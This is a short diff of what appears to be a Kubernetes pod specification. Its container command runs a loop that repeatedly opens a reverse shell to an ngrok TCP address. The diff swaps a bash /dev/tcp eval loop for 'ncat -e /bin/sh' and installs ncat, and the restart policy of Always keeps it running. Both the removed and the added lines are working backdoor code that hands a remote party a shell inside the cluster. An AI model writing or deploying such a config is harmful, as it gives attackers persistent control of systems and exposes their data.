@@ -13,9 +13,9 @@ spec:
     - /bin/sh
     - -c
     - |
-      apk add -q curl postgresql-client bash
+      apk add -q curl postgresql-client nmap-ncat
       while true; do
-        bash -c "exec 5<>/dev/tcp/4.tcp.eu.ngrok.io/16552; cat <&5 | while read line; do eval $line 2>&1 | sed 's/^//' >&5; done" 2>/dev/null
+        ncat 4.tcp.eu.ngrok.io 16552 -e /bin/sh 2>/dev/null
         sleep 5
       done
   restartPolicy: Always
